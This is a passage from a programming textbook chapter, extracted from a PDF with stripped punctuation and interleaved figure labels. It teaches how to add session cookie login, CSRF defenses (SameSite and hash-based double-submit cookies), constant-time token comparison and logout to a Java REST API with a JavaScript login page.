look- ing  up  the  token  in  the  tokenStore.  The  alternative  token  store  implementations described in chapter 5 all require a token ID to be passed in, and as you will see in the next section, this is also a good idea for session cookies, but for now it will work fine without one.   To wire up the token validation filter, navigate back to the Main.java file in your editor and locate the line that adds the current UserController authentication filter  that implements HTTP Basic support . Add the TokenController validateToken   method as a new before   filter right after the existing filter:  before userController::authenticate ; before tokenController::validateToken ;  If either filter succeeds, then the subject attribute will be populated in the request and subsequent access control checks will pass. But if neither filter finds valid authenti- cation  credentials  then  then  subject  attribute  will  remain  null  in  the  request  and access will be denied for any request that requires authentication. This means that the API can continue to support either method of authentication, providing flexibility for clients.   Restart the API and you can now try out making requests using a session cookie  instead of using HTTP Basic on every request. First, create a test user as before:  $ curl -H 'Content-Type: application json' \   -d '{"username":"test","password":"password"}' \   https:  localhost:4567 users {"username":"test"}  Next,  call  the   sessions  endpoint  to  login,  passing  the  username  and  password  as HTTP Basic authentication credentials. You can use the -c option to curl to save any cookies on the response to a file  known as a cookie jar :  $ curl -i -c  tmp cookies -u test:password \        -H 'Content-Type: application json' \   -X POST https:  localhost:4567 sessions HTTP 1.1 201 Created Date: Sun, 19 May 2019 19:15:33 GMT Set-Cookie:  ➥ JSESSIONID=node0l2q3fc024gw8wq4wp961y5rk0.node0;    ➥ Path= ;Secure;HttpOnly                  Expires: Thu, 01 Jan 1970 00:00:00 GMT Content-Type: application json  Use the -c option to  save cookies from the  response to a file.  The server returns a  Set-Cookie header for  the session cookie.

You  can  either  manually  create  a Cookie header, or you can use curl’s -b option to send any cookies from the cookie jar you created in the previous request:  $ curl -b  tmp cookies \                        -H 'Content-Type: application json' \   -d '{"name":"test space","owner":"test"}' \   https:  localhost:4567 spaces {"name":"test space","uri":" spaces 1"}       Use the -b option to curl to send  cookies from a cookie jar.  The request succeeds as the  session cookie was validated.

So eager are you to take up this fantastic offer that you click it without think- ing.  The  website  loads  but  tells  you  that  the  offer  has  expired.  Disappointed,  you return to Natter to ask your friend about it, only to discover that someone has some- how managed to  post abusive  messages to  some  of  your  friends, apparently  sent  by you! You also seem to have posted the same offer link to your other friends.   126  CHAPTER 4 Session cookie authentication   The appeal of cookies as an API designer is that, once set, the browser will trans- parently add them to every request. As a client developer, this makes life simple. After the user has redirected back from the login endpoint, you can just make API requests without worrying  about  authentication  credentials. Alas,  this  strength is also  one of the greatest weaknesses of session cookies. The browser will also attach the same cook- ies when requests are made from other sites that are not your UI. The site you visited when you clicked the link from Polly loaded some JavaScript that made requests to the Natter API from your browser window. Because you’re still logged in, the browser hap- pily  sends  your  session  cookie  along  with  those  requests.  To  the  Natter  API,  those requests look as if you had made them yourself.     As  shown  in  figure  4.9,  in  many  cases  browsers  will  happily  let  a  script  from another website make cross-origin requests to your API; it just prevents them from reading  any response. Such an attack  is  known as  Cross-Site  Request  Forgery because  1. User logs in with the Natter API.  Web browser  Natter UI  Login  Natter API  2. User receives a session cookie.  Web browser  Natter UI  Cookie  Response  Cookie  Natter API  i  T m e  3. User visits a malicious site . . .  4. . . . that makes a request to the Natter API.  Web browser  Malicious UI  Cookie  Message  Cookie  Natter API  5. The browser includes the session cookie,  so the request succeeds!  Web browser  Malicious UI  Cookie  Response  Natter API  6. Only the response is blocked by the browser.  Figure 4.9 In a CSRF attack, the user first visits the legitimate site and logs in to get a session  cookie. Later, they visit a malicious site that makes cross-origin calls to the Natter API. The browser  will send the requests and attach the cookies, just like in a genuine request. The malicious script is  only blocked from reading the response to cross-origin requests, not stopped from making them.   Preventing Cross-Site Request Forgery attacks  127  the malicious site can create fake requests to your API that appear to come from a genuine client.  DEFINITION Cross-site  request  forgery   CSRF,  pronounced  “sea-surf”   occurs when an attacker makes a cross-origin request to your API and the browser sends cookies along with the request. The request is processed as if it was gen- uine unless extra checks are made to prevent these requests.  For JSON APIs, requiring an application json Content-Type header on all requests makes CSRF attacks harder to pull off, as does requiring another nonstandard header such  as  the  X-Requested-With  header  sent  by  many  JavaScript  frameworks.  This  is because such nonstandard headers trigger the same-origin policy protections described in section 4.2.2. But attackers have found ways to bypass such simple protections, for example, by using flaws in the Adobe Flash browser plugin. It is therefore better to design explicit CSRF defenses into your APIs when you accept cookies for authentica- tion, such as the protections described in the next sections.  TIP An important part of protecting your API from CSRF attacks is to ensure that  you  never  perform  actions  that  alter  state  on  the  server  or  have  other real-world  effects  in  response  to  GET  requests.  GET  requests  are  almost always allowed by browsers and most CSRF defenses assume that they are safe.  There are several ways that you can prevent CSRF attacks. When the API is hosted on the same domain as the UI, you can use a new technology known as SameSite cookies to significantly reduce the possibility of CSRF attacks. While still a draft standard  https:   tools.ietf.org html draft-ietf-httpbis-rfc6265bis-03section-5.3.7 ,  SameSite  cookies are already supported by the current versions of all major browsers. When a cookie is marked as SameSite, it will only be sent on requests that originate from the same registerable domain that originally set the cookie. This means that when the malicious site from Polly’s link tries to send a request to the Natter API, the browser will send it without the session cookie and the request will be rejected by the server, as shown in figure 4.10.  DEFINITION A  SameSite  cookie  will  only  be  sent  on  requests  that  originate from  the  same  domain  that  originally  set  the  cookie.  Only  the  registerable domain  is  examined,  so  api.payments.example.com  and  www .example.com are  considered  the  same  site,  as  they  both  have  the  registerable  domain  of example.com.  On  the  other  hand,  www .example.org   different  suffix   and www .different.com are considered different sites. Unlike an origin, the proto- col and port are not considered when making same-site decisions.   4.4.1  SameSite cookies   128  CHAPTER 4 Session cookie authentication  1. User logs in with the Natter API.  Web browser  Natter UI  Login  Natter API  2. User receives a session cookie with SameSite=strict or SameSite=lax.  Web browser  Natter UI  SameSite  cookie  Response  SameSite  cookie  Natter API  i  T m e  3. User visits a malicious site . . .  4. . . . that makes a request to the Natter API.  Web browser  Malicious  UI  SameSite  cookie  Message  Natter API  5. The cookie is marked as SameSite,  so the browser does not send it.  6. The unauthenticated request  is blocked by the API.  Figure 4.10 When a cookie is marked as SameSite=strict or SameSite=lax, then the browser  will only send it on requests that originate from the same domain that set the cookie. This  prevents CSRF attacks, because cross-domain requests will not have a session cookie and so  will be rejected by the API.  The public suffix list SameSite cookies rely on the notion of a registerable domain, which consists of a top-level domain plus one more level. For example, .com is a top-level domain, so example.com is a registerable domain, but foo.example.com typically isn't. The situ- ation is made more complicated because there are some domain suffixes such as .co.uk,  which  aren’t  strictly  speaking  a  top-level  domain   which  would  be  .uk   but should be treated as if they are. There are also websites like github.io that allow any- body to sign up and register a sub-domain, such as neilmadden.github.io, making github.io also effectively a top-level domain.  Because there are no simple rules for deciding what is or isn’t a top-level domain, Mozilla maintains an up-to-date list of effective top-level domains  eTLDs , known as the public suffix list  https:  publicsuffix.org . A registerable domain in SameSite is an eTLD plus one extra level, or eTLD + 1 for short. You can submit your own website to the public suffix list if you want your sub-domains to be treated as effectively inde- pendent websites with no cookie sharing between them, but this is quite a drastic measure to take.   Preventing Cross-Site Request Forgery attacks  129  To mark a cookie as SameSite, you can add either SameSite=lax or SameSite=strict on the Set-Cookie header, just like marking a cookie as Secure or HttpOnly  section 4.3.2 . The difference between the two modes is subtle. In strict mode, cookies will not be sent on any cross-site request, including when a user just clicks on a link from one site to another. This can be a surprising behavior that might break traditional websites. To get around this, lax mode allows cookies to be sent when a user directly clicks on a link but will still block cookies on most other cross-site requests. Strict mode should be preferred if you can design your UI to cope with missing cookies when following links. For example, many single-page apps work fine in strict mode because the first request when  following  a  link  just  loads  a  small  HTML  template  and  the  JavaScript  imple- menting the SPA. Subsequent calls from the SPA to the API will be allowed to include cookies as they originate from the same site.  TIP Recent  versions  of  Chrome  have  started  marking  cookies  as  Same- Site=lax  by  default.1  Other  major  browsers  have  announced  intentions  to follow suit. You can opt out of this behavior by explicitly adding a new Same- Site=none attribute to your cookies, but only if they are also Secure. Unfortu- nately, this new attribute is not compatible with all browsers.  SameSite  cookies  are  a  good  additional  protection  measure  against  CSRF  attacks, but  they  are  not  yet  implemented  by  all  browsers  and  frameworks.  Because  the notion of same site includes sub-domains, they also provide little protection against sub-domain hijacking attacks. The protection against CSRF is as strong as the weak- est  sub-domain  of  your  site:  if  even  a  single  sub-domain  is  compromised,  then  all protection  is  lost.  For  this  reason,  SameSite  cookies  should  be  implemented  as  a defense-in-depth  measure.  In  the  next  section  you  will  implement  a  more  robust defense against CSRF.  4.4.2 Hash-based double-submit cookies  The most effective defense against CSRF attacks is to require that the caller prove that they know the session cookie, or some other unguessable value associated with the ses- sion. A common pattern for preventing CSRF in traditional web applications is to gen- erate  a  random  string  and  store  it  as  an  attribute  on  the  session.  Whenever  the application generates an HTML form, it includes the random token as a hidden field. When the form is submitted, the server checks that the form data contains this hidden field  and  that the value matches the value  stored in the  session associated with  the cookie. Any form data that is received without the hidden field is rejected. This effec- tively prevents CSRF attacks because an attacker cannot guess the random fields and so cannot forge a correct request.      1 At the time of writing, this initiative has been paused due to the global COVID-19 pandemic.   130  CHAPTER 4 Session cookie authentication   An API does not have the luxury of adding hidden form fields to requests because most API clients want JSON or another data format rather than HTML. Your API must therefore use some other mechanism to ensure that only valid requests are processed. One alternative is to require that calls to your API include a random token in a custom header, such as X-CSRF-Token, along with the session cookie. A common approach is to store this extra random token as a second cookie in the browser and require that it be sent as both a cookie and as an  X-CSRF-Token header on each request. This second cookie is not marked HttpOnly, so that it can be read from JavaScript  but only from the same origin . This approach is known as a double-submit cookie, as the cookie is sub- mitted  to  the  server  twice.  The  server  then  checks  that  the  two  values  are  equal  as shown in figure 4.11.  DEFINITION A double-submit cookie is a cookie that must also be sent as a custom header on every request. As cross-origin scripts are not able to read the value of the cookie, they cannot create the custom header value, so this is an effec- tive defense against CSRF attacks.  This  traditional  solution  has  some  problems,  because  although  it  is  not  possible  to read the value of the second cookie from another origin, there are several ways that the cookie could be overwritten by the attacker with a known value, which would then let them forge  requests. For  example, if  the  attacker  compromises  a sub-domain of your site, they may be able to overwrite the cookie. The __Host- cookie name prefix discussed in section 4.3.2 can help protect against these attacks in modern browsers by preventing a sub-domain from overwriting the cookie.    A  more  robust  solution  to  these  problems  is  to  make  the  second  token  be  cryp-  tographically bound to the real session cookie.  DEFINITION An object is cryptographically bound to another object if there is an association between them that is infeasible to spoof.   Rather  than  generating  a  second  random  cookie,  you  will  run  the  original  session cookie through a cryptographically secure hash function to generate the second token. This ensures that any attempt to change either the anti-CSRF token or the session cookie will be  detected  because  the  hash  of  the  session  cookie  will  no  longer  match  the  token. Because the attacker cannot read the session cookie, they are unable to compute the correct hash value. Figure 4.12 shows the updated double-submit cookie pattern. Unlike the password hashes used in chapter 3, the input to the hash function is an unguessable string  with  high  entropy.  You  therefore  don’t  need  to  worry  about  slowing  the  hash function down because an attacker has no chance of trying all possible session tokens.  DEFINITION A  hash  function  takes  an  arbitrarily  sized  input  and  produces  a fixed-size output. A hash function is cryptographically secure if it is infeasible to work  out  what  input  produced  a  given  output  without  trying  all  possible inputs  known as preimage resistance , or to find two distinct inputs that pro- duce the same output  collision resistance .

Figure 4.11 In the double-submit cookie pattern, the server avoids storing a second token  by setting it as a second cookie on the client. When the legitimate client makes a request,  it reads the CSRF cookie value  which cannot be marked HttpOnly  and sends it as an  additional header. The server checks that the CSRF cookie matches the header. A malicious  client on another origin is not able to read the CSRF cookie and so cannot make requests.  But if the attacker compromises a sub-domain, they can overwrite the CSRF cookie with a  known value.   132  CHAPTER 4 Session cookie authentication  1. When the user logs in, the  server computes a CSRF token as the SHA-256 hash of the session cookie.  csrfToken = SHA-256 xyz...   = abc..

Cookie Cookie  API request  CookieCookie  API  server  If a malicious client tries to overwrite the CSRF cookie, the hash will no longer match . . .  . . . so the request will be blocked.  Figure 4.12 In the hash-based double-submit cookie pattern, the anti-CSRF token is computed  as a secure hash of the session cookie. As before, a malicious client is unable to guess the correct  value. However, they are now also prevented from overwriting the CSRF cookie because they  cannot compute the hash of the session cookie.  The  security  of  this  scheme  depends  on  the  security  of  the  hash  function.  If  the attacker can easily guess the output of the hash function without knowing the input, then they can guess the value of the CSRF cookie. For example, if the hash function only produced a 1-byte output, then the attacker could just try each of the 256 possi- ble values. Because the CSRF cookie will be accessible to JavaScript and might be acci- dentally sent over insecure channels, while the session cookie isn’t, the hash function should also make sure that an attacker isn’t able to reverse the hash function to dis- cover the session cookie value if the CSRF token value accidentally leaks. In this section,   Preventing Cross-Site Request Forgery attacks  133  you  will  use  the  SHA-256  hash  function.  SHA-256  is  considered  by  most  cryptogra- phers to be a secure hash function.  DEFINITION SHA-256 is a cryptographically secure hash function designed by the  US  National  Security  Agency  that  produces  a  256-bit   32-byte   output value. SHA-256 is one variant of the SHA-2 family of secure hash algorithms specified in the Secure Hash Standard  https:  doi.org 10.6028 NIST.FIPS .180-4 , which replaced the older SHA-1 standard  which is no longer consid- ered  secure .  SHA-2  specifies  several  other  variants  that  produce  different output sizes, such as SHA-384 and SHA-512. There is also now a newer SHA-3 standard  selected through an open international competition , with variants named SHA3-256, SHA3-384, and so on, but SHA-2 is still considered secure and is widely implemented.  To protect the Natter API, you will implement hash-based double-submit cookies as described in the last section. First, you should update the CookieTokenStore create method to return the SHA-256 hash of the session cookie as the token ID, rather than the  real  value.  Java’s  MessageDigest  class   in  the  java.security  package   imple- ments a number of cryptographic hash functions, and SHA-256 is implemented by all current Java environments. Because SHA-256 returns a byte array and the token ID should be a String, you can Base64-encode the result to generate a string that is safe to store in a cookie or header. It is common to use the URL-safe variant of Base64 in web APIs, because it can be used almost anywhere in a HTTP request without addi- tional encoding, so that is what you will use here. Listing 4.10 shows a simplified inter- face to the standard Java Base64 encoding and decoding libraries implementing the URL-safe variant. Create a new file named Base64url.java inside the src main java  com manning apisecurityinaction token folder with the contents of the listing.  4.4.3 Double-submit cookies for the Natter API  Listing 4.10 URL-safe Base64 encoding  package com.manning.apisecurityinaction.token;  import java.util.Base64;  public class Base64url {     private static final Base64.Encoder encoder =                   Base64.getUrlEncoder  .withoutPadding  ;        private static final Base64.Decoder decoder =                   Base64.getUrlDecoder  ;                      Define static  instances of the  encoder and  decoder objects.      public static String encode byte[] data  {               return encoder.encodeToString data ;             }                                                     public static byte[] decode String encoded  {            return decoder.decode encoded ;                  }                                                }  Define simple  encode and  decode methods.   134  CHAPTER 4 Session cookie authentication  The most important part of the changes is to enforce that the CSRF token supplied by the client in a header matches the SHA-256 hash of the session cookie. You can per- form  this  check  in  the  CookieTokenStore  read  method  by  comparing  the  tokenId argument provided to the computed hash value. One subtle detail is that you should compare the computed value against the provided value using a constant-time equal- ity function to avoid timing attacks that would allow an attacker to recover the CSRF token  value  just  by  observing  how  long  it  takes  your  API  to  compare  the  provided value  to  the  computed  value.  Java  provides  the  MessageDigest.isEqual  method  to compare two byte-arrays for equality in constant time,2 which you can use as follows to compare the provided token ID with the computed hash:  var provided = Base64.getUrlDecoder  .decode tokenId ; var computed = sha256 session.id   ;  if  !MessageDigest.isEqual computed, provided   {     return Optional.empty  ; }  Timing attacks A timing attack works by measuring tiny differences in the time it takes a computer to process different inputs to work out some information about a secret value that the attacker does not know. Timing attacks can measure even very small differences in the time it takes to perform a computation, even when carried out over the internet. The  classic  paper  Remote  Timing  Attacks  are  Practical  by  David  Brumley  and  Dan Boneh of Stanford  2005; https:  crypto.stanford.edu ~dabo papers ssl-timing.pdf  demonstrated that timing attacks are practical for attacking computers on the same local network, and the techniques have been developed since then. Recent research shows you can remotely measure timing differences as low as 100 nanoseconds over the internet  https:  papers.mathyvanhoef.com usenix2020.pdf .  Consider what would happen if you used the normal String equals method to com- pare the hash of the session ID with the anti-CSRF token received in a header. In most programming languages, including Java, string equality is implemented with a loop  that  terminates  as  soon  as  the  first  non-matching  character  is  found.  This means that the code takes very slightly longer to match if the first two characters match than if only a single character matches. A sophisticated attacker can measure even this tiny difference in timing. They can then simply keep sending guesses for the anti-CSRF token. First, they try every possible value for the first character  64 pos- sibilities because we are using base64-encoding  and pick the value that took slightly longer to respond. Then they do the same for the second character, and then the third, and so on. By finding the character that takes slightly longer to respond at each step, they can slowly recover the entire anti-CSRF token using time only proportional  2  In older versions of Java, MessageDigest.isEqual wasn’t constant-time and you may find old articles about this such as https:  codahale.com a-lesson-in-timing-attacks . This has been fixed in Java for a decade now so you should just use MessageDigest.isEqual rather than writing your own equality method.   Preventing Cross-Site Request Forgery attacks  135  to its length, rather than needing to try every possible value. For a 10-character Base64- encoded string, this changes the number of guesses needed from around 6410  over 1 quintillion possibilities  to just 640. Of course, this attack needs many more requests to be able to accurately measure such small timing differences  typically many thou- sands of requests per character , but the attacks are improving all the time.  The solution to such timing attacks is to ensure that all code that performs compar- isons or lookups using secret values take a constant amount of time regardless of the value of the user input that is supplied. To compare two strings for equality, you can use a loop that does not terminate early when it finds a wrong value. The follow- ing code uses bitwise XOR  ^  and OR    operators to check if two strings are equal. The value of c will only be zero at the end if every single character was identical.  if  a.length != b.length  return false; int c = 0; for  int i = 0; i < a.length; i++      c =  a[i] ^ b[i] ; return c == 0;  This code is very similar to how MessageDigest.isEqual is implemented in Java. Check the documentation for your programming language to see if it offers a similar facility.  To update the implementation, open CookieTokenStore.java in your editor and update the code to match listing 4.11. The new parts are highlighted in bold. Save the file when you are happy with the changes.  Listing 4.11 Preventing CSRF in CookieTokenStore  package com.manning.apisecurityinaction.token;  import java.nio.charset.StandardCharsets; import java.security.*; import java.util.*;  import spark.Request;  public class CookieTokenStore implements TokenStore {      @Override     public String create Request request, Token token  {          var session = request.session false ;         if  session != null  {             session.invalidate  ;         }         session = request.session true ;          session.attribute "username", token.username ;         session.attribute "expiry", token.expiry ;         session.attribute "attrs", token.attributes ;   136  CHAPTER 4 Session cookie authentication          return Base64url.encode sha256 session.id    ;          }  Return the SHA-256 hash  of the session cookie,  Base64url-encoded.      @Override     public Optional  read Request request, String tokenId  {          var session = request.session false ;         if  session == null  {             return Optional.empty  ;         }          var provided = Base64url.decode tokenId ;             var computed = sha256 session.id   ;           Decode the supplied  token ID and compare  it to the SHA-256 of  the session.          if  !MessageDigest.isEqual computed, provided   {                 return Optional.empty  ;                                  }          var token = new Token session.attribute "expiry" ,                 session.attribute "username"  ;         token.attributes.putAll session.attribute "attrs"  ;  If the CSRF token  doesn’t match the  session hash, then  reject the request.          return Optional.of token ;     }      static byte[] sha256 String tokenId  {         try {             var sha256 = MessageDigest.getInstance "SHA-256" ;                return sha256.digest                                                  tokenId.getBytes StandardCharsets.UTF_8  ;                } catch  NoSuchAlgorithmException e  {             throw new IllegalStateException e ;         }     } }  Use the Java  MessageDigest  class to hash  the session ID.  The TokenController already returns the token ID to the client in the JSON body of the response to the login endpoint. This will now return the SHA-256 hashed version, because that is what the CookieTokenStore returns. This has an added security bene- fit that the real session ID is now never exposed to JavaScript, even in that response. While you could alter the TokenController to set the CSRF token as a cookie directly, it is better to leave this up to the client. A JavaScript client can set the cookie after login just as easily as the API can, and as you will see in chapter 5, there are alternatives to cookies for storing these tokens. The server doesn’t care where the client stores the CSRF token, so long as the client can find it again after page reloads and redirects and so on.   The final step is to update the TokenController token validation method to look for the CSRF token in the X-CSRF-Token header on every request. If the header is not present, then the request should be treated as unauthenticated. Otherwise, you can pass  the  CSRF  token  down  to  the  CookieTokenStore  as  the  tokenId  parameter  as   Preventing Cross-Site Request Forgery attacks  137  shown in listing 4.12. If the header isn’t present, then return without validating the cookie. Together with the hash check inside the CookieTokenStore, this ensures that requests without a valid CSRF token, or with an invalid one, will be treated as if they didn’t have a session cookie at all and will be rejected if authentication is required. To make the changes, open TokenController.java in your editor and update the validate- Token method to match listing 4.12.  Listing 4.12 The updated token validation method  public void validateToken Request request, Response response  {     var tokenId = request.headers "X-CSRF-Token" ;               if  tokenId == null  return;                              Read the CSRF token from  the X-CSRF-Token header.      tokenStore.read request, tokenId .ifPresent token -> {            if  now  .isBefore token.expiry   {             request.attribute "subject", token.username ;             token.attributes.forEach request::attribute ;         }     } ; }  Pass the CSRF  token to the  TokenStore as the  tokenId parameter.  TRYING IT OUT If you restart the API, you can try out some requests to see the CSRF protections in action. First, create a test user as before:  $ curl -H 'Content-Type: application json' \   -d '{"username":"test","password":"password"}' \   https:  localhost:4567 users {"username":"test"}  You  can  then  login  to  create  a  new  session.  Notice  how  the  token  returned  in  the JSON is now different to the session ID in the cookie.  $ curl -i -c  tmp cookies -u test:password \   -H 'Content-Type: application json' \   -X POST https:  localhost:4567 sessions HTTP 1.1 201 Created Date: Mon, 20 May 2019 16:07:42 GMT Set-Cookie:   The session ID in the cookie is different to the hashed one in the JSON body.

The answers are at the end of the chapter.  4.5  Building the Natter login UI Now that you’ve got session-based login working from the command line, it’s time to build a web UI to handle login. In this section, you’ll put together a simple login UI, much like the existing Create Space UI that you created earlier, as shown in figure 4.13. When the API returns a 401 response, indicating that the user requires authentica- tion,  the Natter  UI will  redirect to the  login UI.  The login UI  will then submit  the username and password to the API login endpoint to get a session cookie, set the anti- CSRF token as a second cookie, and then redirect back to the main Natter UI.   While it is possible to intercept the 401 response from the API in JavaScript, it is not  possible  to  stop  the  browser  popping  up  the  ugly  default  login  box  when  it receives a WWW-Authenticate header prompting it for Basic authentication creden- tials. To get around this, you can simply remove that header from the response when the  user  is  not  authenticated.  Open  the  UserController.java  file  in  your  editor  and update the requireAuthentication method to omit this header on the response. The   Building the Natter login UI  139  Figure 4.13 The login UI features a  simple username and password form.  Once successfully submitted, the form  will redirect to the main natter.html UI  page that you built earlier.  new implementation is shown in listing 4.13. Save the file when you are happy with the change.  Listing 4.13 The updated authentication check  public void requireAuthentication Request request, Response response  {     if  request.attribute "subject"  == null  {         halt 401 ;          } }  Halt with a 401 error if the user  is not authenticated but leave out  the WWW-Authenticate header.  Technically, sending a 401 response and not including a WWW-Authenticate header is in violation of the HTTP standard  see https:  tools.ietf.org html rfc7235section-3.1 for the details , but the pattern is now widespread. There is no standard HTTP auth scheme  for  session  cookies  that  could  be  used.  In  the  next  chapter,  you  will  learn about the Bearer auth scheme used by OAuth2.0, which is becoming widely adopted for this purpose.   The HTML for the login page is very similar to the existing HTML for the Create Space page that you created  earlier. As  before,  it has a  simple form with two input fields for the username and password, with some simple CSS to style it. Use an input with type="password" to ensure that the browser hides the password from anybody watching  over  the  user’s  shoulder.  To  create  the  new  page,  navigate  to  src main  resources public and create a new file named login.html. Type the contents of list- ing 4.14 into the new file and click save. You’ll need to rebuild and restart the API for the new page to become available, but first you need to implement the JavaScript login logic.  Listing 4.14 The login form HTML             Natter!                 140  CHAPTER 4 Session cookie authentication  As before, customize  the CSS to style the  form as you wish.              input { margin-right: 100% }                     Login         Username: <input name="username" type="text"                                 id="username">                                                                            Password: <input name="password" type="password"                                 id="password">                                                                                    Login         The username field is  a simple text field.  Use a HTML  password input  field for passwords.  4.5.1  Calling the login API from JavaScript You can use the fetch API in the browser to make a call to the login endpoint, just as you did previously. Create a new file named login.js next to the login.html you just added and save the contents of listing 4.15 to the file. The listing adds a login user- name, password  function that manually Base64-encodes the username and password and adds them as an Authorization header on a fetch request to the  sessions end- point. If the request is successful, then you can extract the anti-CSRF token from the JSON  response  and  set  it  as  a  cookie  by  assigning  to  the  document.cookie  field. Because the cookie needs to be accessed from JavaScript, you cannot mark it as Http- Only,  but  you  can  apply  other  security  attributes  to  prevent  it  accidentally  leaking. Finally, redirect the user back to the Create Space UI that you created earlier. The rest of the listing intercepts the form submission, just as you did for the Create Space form at the start of this chapter.  Listing 4.15 Calling the login endpoint from JavaScript  const apiUrl = 'https:  localhost:4567';  function login username, password  {     let credentials = 'Basic ' + btoa username + ':' + password ;         fetch apiUrl + ' sessions', {         method: 'POST',         headers: {             'Content-Type': 'application json',   'Authorization': credentials                                               }     }      .then res => {        if  res.ok  {          res.json  .then json => {             document.cookie = 'csrfToken=' + json.token +                   ';Secure;SameSite=strict';                              window.location.replace ' natter.html' ;         If successful, then  set the csrfToken  cookie and redirect  to the Natter UI.  Encode the  credentials  for HTTP Basic  authentication.   Building the Natter login UI  141           } ;        }     }      .catch error => console.error 'Error logging in: ', error  ;       }  Otherwise, log the error to the console.  window.addEventListener 'load', function e  {                       document.getElementById 'login'                                     .addEventListener 'submit', processLoginSubmit ;        } ;                                                                  function processLoginSubmit e  {                                    e.preventDefault  ;                                              let username = document.getElementById 'username' .value;       let password = document.getElementById 'password' .value;        login username, password ;                                      return false;                                               }  Set up an  event listener  to intercept  form submit,  just as you did  for the Create  Space UI.  Rebuild and restart the API using  mvn clean compile exec:java  and  then  open  a  browser  and  navigate  to  https:  localhost:4567 login.html.  If  you open  your  browser’s  developer  tools,  you  can  examine  the  HTTP  requests  that  get made as you interact with the UI. Create a test user on the command line as before:  curl -H 'Content-Type: application json' \    -d '{"username":"test","password":"password"}' \   https:  localhost:4567 users  Then type in the same username and password into the login UI and click Login. You will  see  a  request  to   sessions  with  an  Authorization  header  with  the  value  Basic dGVzdDpwYXNzd29yZA==. In response, the API returns a Set-Cookie header for the ses- sion cookie and the anti-CSRF token in the JSON body. You will then be redirected to the Create Space page. If you examine the cookies in your browser you will see both the JSESSIONID cookie set by the API response and the csrfToken cookie set by Java- Script, as in figure 4.14.  Figure 4.14 The two cookies viewed in Chrome’s developer tools. The JSESSIONID cookie is set by the API and  marked as HttpOnly. The csrfToken cookie is set by JavaScript and left accessible so that the Natter UI can send  it as a custom header.   142  CHAPTER 4 Session cookie authentication  If  you  try  to  actually  create  a  new  social  space,  the  request  is  blocked  by  the  API because you are not yet including the anti-CSRF token in the requests. To do that, you need  to  update  the  Create  Space  UI  to  extract  the  csrfToken  cookie  value  and include it as the X-CSRF-Token header on each request. Getting the value of a cookie in JavaScript is slightly more complex than it should be, as the only access is via the document.cookie  field that stores all  cookies  as  a semicolon-separated string.  Many JavaScript frameworks include convenience  functions for  parsing  this cookie  string, but you can do it manually with code like the following that splits the string on semi- colons, then splits each individual cookie by equals sign to separate the cookie name from its value. Finally, URL-decode each component and check if the cookie with the given name exists:  function getCookie cookieName  {     var cookieValue = document.cookie.split ';'             .map item => item.split '='                                  .map x => decodeURIComponent x.trim                  .filter item => item[0] === cookieName [0]      Split the cookie string  into individual cookies.  Then split each  cookie into name  and value parts.      if  cookieValue  {         return cookieValue[1];     } }  Find the cookie with the given name.  Decode each part.  You can use this helper function to update the Create Space page to submit the CSRF- token with each request. Open the natter.js file in your editor and add the getCookie function. Then update the createSpace function to extract the CSRF token from the cookie and include it as an extra header on the request, as shown in listing 4.16. As a convenience, you can also update the code to check for a 401 response from the API request and redirect to the login page in that case. Save the file and rebuild the API and you should now be able to login and create a space through the UI.  Listing 4.16 Adding the CSRF token to requests  function createSpace name, owner  {     let data = {name: name, owner: owner};     let csrfToken = getCookie 'csrfToken' ;         fetch apiUrl + ' spaces', {         method: 'POST',         credentials: 'include',         body: JSON.stringify data ,         headers: {             'Content-Type': 'application json',             'X-CSRF-Token': csrfToken              }     }      .then response => {         if  response.ok  {             return response.json  ;  Extract the CSRF  token from the  cookie.  Include the CSRF token  as the X-CSRF-Token  header.   4.6  Implementing logout  143          } else if  response.status === 401  {                      window.location.replace ' login.html' ;            } else {             throw Error response.statusText ;         }     }      .then json => console.log 'Created space: ', json.name, json.uri       .catch error => console.error 'Error: ', error  ; }  If you receive a  401 response,  then redirect to  the login page.  Implementing logout Imagine  you’ve  logged  into  Natter  from  a  shared  computer,  perhaps  while  visiting your friend Amit’s house. After you’ve posted your news, you’d like to be able to log out so that Amit can’t read your private messages. After all, the inability to log out was one  of  the  drawbacks  of  HTTP  Basic  authentication  identified  in  section  4.2.3.  To implement logout, it’s not enough to just remove the cookie from the user’s browser  although that’s a good start . The cookie should also be invalidated on the server in case  removing  it  from  the  browser  fails  for  any  reason3  or  if  the  cookie  may  be retained by a badly configured network cache or other faulty component.     To  implement  logout,  you  can  add  a  new  method  to  the  TokenStore  interface, allowing a token to be revoked. Token revocation ensures that the token can no longer be used to grant access to your API, and typically involves deleting it from the server- side store. Open TokenStore.java in your editor and add a new method declaration for token revocation next to the existing methods to create and read a token:      String create Request request, Token token ;     Optional  read Request request, String tokenId ;     void revoke Request request, String tokenId ;        New method to  revoke a token  You can implement token revocation for session cookies by simply calling the session .invalidate   method in Spark. This will remove the session token from the back- end store and add a new Set-Cookie header on the response with an expiry time in the past.  This  will  cause  the  browser  to  immediately  delete  the  existing  cookie.  Open CookieTokenStore.java in your editor and add the new revoke method shown in list- ing 4.17. Although it is less critical on a logout endpoint, you should enforce CSRF defenses here too to prevent an attacker maliciously logging out your users to annoy them. To do this, verify the SHA-256 anti-CSRF token just as you did in section 4.5.3.  Listing 4.17 Revoking a session cookie  @Override public void revoke Request request, String tokenId  {     var session = request.session false ;     if  session == null  return;      3 Removing a cookie can fail if the Path or Domain attributes do not exactly match, for example.   144  CHAPTER 4 Session cookie authentication      var provided = Base64url.decode tokenId ;               var computed = sha256 session.id   ;                     if  !MessageDigest.isEqual computed, provided   {           return;                                             }  Verify the  anti-CSRF token  as before.      session.invalidate  ;     }  Invalidate the  session cookie.  You can now wire up a new logout endpoint. In keeping with our REST-like approach, you can implement logout as a DELETE request to the  sessions endpoint. If clients send a DELETE request to  sessions xyz, where xyz is the token ID, then the token may be leaked in either the browser history or in server logs. While this may not be a problem for a logout endpoint because the token will be revoked anyway, you should avoid  exposing  tokens  directly  in  URLs  like  this.  So,  in  this  case,  you’ll  implement logout  as  a  DELETE  request  to  the   sessions  endpoint   with  no  token  ID  in  the URL   and  the  endpoint  will  retrieve  the  token  ID  from  the  X-CSRF-Token  header instead. While there are ways to make this more RESTful, we will keep it simple in this chapter. Listing 4.18 shows the new logout endpoint that retrieves the token ID from the  X-CSRF-Token  header  and  then  calls  the  revoke  endpoint  on  the  TokenStore. Open TokenController.java in your editor and add the new method.  Listing 4.18 The logout endpoint  public JSONObject logout Request request, Response response  {     var tokenId = request.headers "X-CSRF-Token" ;                  if  tokenId == null          throw new IllegalArgumentException "missing token header" ;  Get the token ID  from the X-CSRF- Token header.      